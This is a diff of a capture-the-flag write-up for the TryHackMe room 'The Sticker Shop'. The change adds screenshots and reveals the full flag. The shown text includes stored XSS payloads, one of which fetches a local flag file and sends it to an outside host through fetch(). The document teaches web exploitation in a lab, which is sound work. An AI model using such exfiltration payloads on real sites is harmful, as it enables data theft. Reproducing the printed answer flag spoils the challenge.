@@ -7,10 +7,15 @@ From the challenge description: `they decided to develop and host everything on 
 
 ### Exploitation
 I hosted a local server on port 5000 and injected the following payload: `<script src="http://myip:5000"></script>` . When the payload executed, it confirmed that the feedback was being reviewed in a browser.
+
+<img src="https://raw.githubusercontent.com/c1thu/tryhackme/refs/heads/main/TheStickerShop/stickshop1.png">
+
 Next, I attempted to retrieve the contents of the `flag.txt` file using this payload:
 
 `<script>fetch('/flag.txt').then(res => res.text()).then(flag => fetch('http://myweb.com/?flag='+encodeURIComponent(flag)))</script>`
 
-After submitting the payload, I successfully received the flag: `THM{837xxxxxxxxxxx05ee6}`
+After submitting the payload, I successfully received the flag: `THM{83789a69074f636f64a38879cfcabe8b62305ee6}`
+
+<img src="https://raw.githubusercontent.com/c1thu/tryhackme/refs/heads/main/TheStickerShop/stickshop2.png">
 
 \>_ Happy Hacking
